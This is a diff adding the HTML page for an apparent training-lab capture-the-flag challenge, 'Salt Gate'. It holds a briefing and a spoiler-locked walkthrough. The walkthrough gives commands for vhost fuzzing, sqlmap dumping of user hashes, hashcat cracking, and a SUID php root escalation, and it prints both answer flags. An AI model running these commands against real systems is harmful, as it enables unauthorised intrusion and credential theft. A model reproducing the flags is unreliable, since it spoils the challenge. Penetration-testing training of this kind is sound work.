@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Atlas Mission Control — Salt Gate</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <script src="/static/app.js" defer></script>
+</head>
+<body>
+  <main class="site-shell">
+    <div class="noise" aria-hidden="true"></div>
+    <header class="topbar">
+      <button class="brand" data-view-target="mission" aria-label="Atlas home">
+        <span class="brand-mark"><i></i><i></i><i></i></span>
+        <span><strong>ATLAS</strong><small>VULNSEC ACADEMY</small></span>
+      </button>
+      <div class="topbar-center"><span>MODULE 07</span><b>CHALLENGES</b></div>
+      <div class="environment-pill"><span class="pulse-dot"></span><span><small>ENVIRONMENT</small><strong id="environment-status">CONNECTING</strong></span></div>
+    </header>
+    <div class="workspace">
+      <aside class="rail" aria-label="Mission navigation">
+        <div class="rail-label">TRACE // 03</div>
+        <nav>
+          <button class="active" data-view-target="mission"><span>01</span><i></i><em>Briefing</em></button>
+          <button data-view-target="investigation"><span>02</span><i></i><em>Flags</em></button>
+          <button data-view-target="walkthrough"><span>03</span><i></i><em>Debrief</em></button>
+        </nav>
+        <div class="rail-progress">
+          <div><span>PROGRESS</span><b id="progress-percent">0%</b></div>
+          <div class="progress-track"><i id="progress-bar"></i></div>
+          <small id="progress-copy">0 / 2 flags accepted</small>
+        </div>
+      </aside>
+      <section class="content">
+        <section class="view-enter" data-view="mission">
+          <section class="mission-hero">
+            <div class="hero-copy">
+              <div class="kicker"><span>CHALLENGE 03</span><i></i> NO QUESTION TRAIL</div>
+              <h1>SALT<br><em>GATE</em></h1>
+              <p>A salt works shop is in scope. The public catalogue is not the staff desk. Find the other virtual host, dump hashes that need rules, then a SUID that is not python3.</p>
+              <div class="hero-actions">
+                <button class="primary-button" data-view-target="investigation">Open flag drop <span>→</span></button>
+                <span class="time-chip">◷ &nbsp; 50–80 MIN</span>
+              </div>
+            </div>
+            <div class="radar-card" aria-label="Lab map">
+              <div class="radar-grid"></div>
+              <div class="radar-ring ring-one"></div>
+              <div class="radar-ring ring-two"></div>
+              <div class="radar-ring ring-three"></div>
+              <div class="radar-sweep"></div>
+              <div class="node kali-node"><i></i>KALI<small>OPERATOR</small></div>
+              <div class="node target-node"><i></i><span data-target>10.23.54.144</span><small>SALT GATE</small></div>
+              <div class="radar-caption"><span>LIVE TOPOLOGY</span><b>TARGET ASSIGNED</b></div>
+            </div>
+          </section>
+          <section class="mission-grid">
+            <article class="brief-card coordinates-card">
+              <div class="card-number">01</div>
+              <p class="section-label">NETWORK COORDINATES</p>
+              <div class="coordinate-row"><span>EDGE HOST</span><code data-target>10.23.54.144</code></div>
+              <div class="coordinate-row"><span>SCOPE</span><code>this host, including Host headers / vhosts</code></div>
+              <div class="coordinate-row"><span>ATLAS ACCEPTS</span><code>user + root flags</code></div>
+              <div class="scope-warning"><b>!</b><span>Public search is parameterized. sqlmap should fail there. The staff vhost is the other app.</span></div>
+            </article>
+            <article class="brief-card objectives-card">
+              <div class="card-number">02</div>
+              <p class="section-label">MISSION OBJECTIVES</p>
+              <ol>
+                <li><span>01</span>Fuzz Host and paths</li>
+                <li><span>02</span>Ignore the public search</li>
+                <li><span>03</span>Crack $6$ then SUID php</li>
+                <li><span>04</span>Submit user.txt and root.txt</li>
+              </ol>
+            </article>
+            <article class="brief-card loadout-card">
+              <div class="card-number">03</div>
+              <p class="section-label">OPERATOR LOADOUT</p>
+              <div class="tool-row"><span class="tool-icon">N</span><span><b>Nmap</b><small>Full map, not top 1000 only</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">K</span><span><b>Kali toolkit</b><small>ffuf, sqlmap, hashcat -m 1800</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">G</span><span><b>GTFOBins</b><small>When you have a shell</small></span><i>READY</i></div>
+            </article>
+          </section>
+        </section>
+
+        <section class="investigation-layout view-enter is-hidden" data-view="investigation">
+          <section class="investigation-main">
+            <div class="view-heading">
+              <div>
+                <p class="section-label">FLAG DROP</p>
+                <h2>Proof only.</h2>
+              </div>
+              <span id="cleared-copy">0/2 FLAGS</span>
+            </div>
+            <div class="question-stack" id="question-stack" aria-live="polite"></div>
+          </section>
+          <aside class="intel-panel">
+            <div class="intel-head"><span class="pulse-dot"></span><b>OPERATOR INTEL</b></div>
+            <div class="intel-stat"><span>LAB STATUS</span><strong id="intel-status">CONNECTING</strong></div>
+            <div class="intel-stat"><span>CURRENT PHASE</span><strong id="current-phase">01 / USER FLAG</strong></div>
+            <div class="intel-stat"><span>USER FLAG</span><strong id="intel-user">PENDING</strong></div>
+            <div class="intel-stat"><span>ROOT FLAG</span><strong id="intel-root">PENDING</strong></div>
+            <div class="intel-stat is-hidden"><span>HINTS USED</span><strong id="hints-used">00</strong></div>
+            <div class="mini-progress"><i id="mini-progress"></i></div>
+            <p>No stepwise questions. Atlas only checks the two flags.</p>
+            <p class="preview-link is-hidden" id="preview-target-link">Preview: public face at <a href="/site/">/site/</a>. Extra services are not in this preview.</p>
+            <button class="primary-button compact is-hidden" id="open-debrief">Open debrief →</button>
+          </aside>
+        </section>
+
+        <section class="walkthrough view-enter is-hidden" data-view="walkthrough">
+          <section class="locked-walkthrough" id="walkthrough-lock">
+            <div class="lock-orbit"><span>03</span></div>
+            <p class="section-label">DEBRIEF LOCKED</p>
+            <h2>This is a challenge.</h2>
+            <p>The walkthrough names services, loot, and both flags. Submit user and root, or reveal if you are genuinely stuck.</p>
+            <div>
+              <button class="primary-button" data-view-target="investigation">Return to flag drop <span>→</span></button>
+              <button class="ghost-button" id="reveal-walkthrough">Reveal full walkthrough</button>
+            </div>
+          </section>
+          <div class="is-hidden" id="walkthrough-content">
+            
+            <div class="view-heading walkthrough-heading">
+              <div><p class="section-label">MISSION DEBRIEF</p><h2>Wrong app, right app.</h2></div>
+              <span id="walkthrough-badge" class="success-badge">MISSION COMPLETE</span>
+            </div>
+            <section class="debrief-summary"><div><span>01</span><p>VHOST</p><b>staff</b></div><i>→</i><div><span>02</span><p>SQLi</p><b>q=</b></div><i>→</i><div><span>03</span><p>HASH</p><b>Password1</b></div><i>→</i><div><span>04</span><p>SUID</p><b>php</b></div></section>
+            
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">01</span>
+                <p class="section-label">VHOST</p>
+                <h3>staff.saltgate.internal</h3>
+                <p>Public /search is bound. ffuf -H Host: or /internal/.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> ffuf -u http://10.23.54.144 -H 'Host: FUZZ' -w vhosts.txt</div>
+                  <div class="terminal-output"><div class="hot">staff.saltgate.internal</div></div>
+                </div>
+                
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">02</span>
+                <p class="section-label">SQLi</p>
+                <h3>/search?q= on the staff host</h3>
+                <p>sqlmap --dump staff users.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> sqlmap -u 'http://10.23.54.144/search?q=test' -H 'Host: staff.saltgate.internal' --batch --dump</div>
+                  <div class="terminal-output"><div class="hot">n.briggs  $6$...</div></div>
+                </div>
+                
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">03</span>
+                <p class="section-label">CRACK</p>
+                <h3>-m 1800, rockyou. Password1.</h3>
+                <p>SSH n.briggs.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt</div>
+                  <div class="terminal-output"><div class="hot">Password1</div><div class="flag">CH{salt_gate_user}</div></div>
+                </div>
+                
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">04</span>
+                <p class="section-label">SUID</p>
+                <h3>php is setuid. Not python3.</h3>
+                <p>find / -perm -4000. php -r posix_setuid.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> php -r 'posix_setuid(0); system("cat /root/root.txt");'</div>
+                  <div class="terminal-output"><div class="flag">CH{salt_gate_root}</div></div>
+                </div>
+                
+              </figure>
+            </section>
+
+            <section class="completion-card">
+              <div><span>CHALLENGE</span><h3>Gate taken.</h3><p>Play the extra shares and decoys next time — they are part of the box.</p></div>
+              <div class="completion-stats">
+                <span><small>FLAGS</small><b id="completion-objectives">02 / 02</b></span>
+                <span><small>HINTS USED</small><b id="completion-hints">00</b></span>
+              </div>
+              <button class="ghost-button" id="repeat-mission">Repeat mission</button>
+            </section>
+
+          </div>
+        </section>
+      </section>
+    </div>
+  </main>
+  <dialog class="spoiler-dialog" id="walkthrough-confirm" aria-labelledby="walkthrough-confirm-title" aria-describedby="walkthrough-confirm-copy">
+    <div class="spoiler-dialog-card">
+      <div class="spoiler-icon" aria-hidden="true">!</div>
+      <p class="section-label">SPOILER WARNING</p>
+      <h2 id="walkthrough-confirm-title">Reveal the full walkthrough?</h2>
+      <p id="walkthrough-confirm-copy">This exposes the path and both flags. Debrief will be marked <strong>SOLUTION REVEALED</strong>.</p>
+      <div class="spoiler-dialog-actions">
+        <button class="ghost-button" id="cancel-walkthrough-reveal" type="button">Cancel — keep trying</button>
+        <button class="danger-button" id="confirm-walkthrough-reveal" type="button">Reveal anyway</button>
+      </div>
+      <small>There is no hint ladder on this challenge — only this debrief.</small>
+    </div>
+  </dialog>
+  <div class="portal-error is-hidden" id="portal-error" role="alert"><b>MISSION CONTROL OFFLINE</b><span>Start or reset the lab, then reload this page.</span></div>
+</body>
+</html>
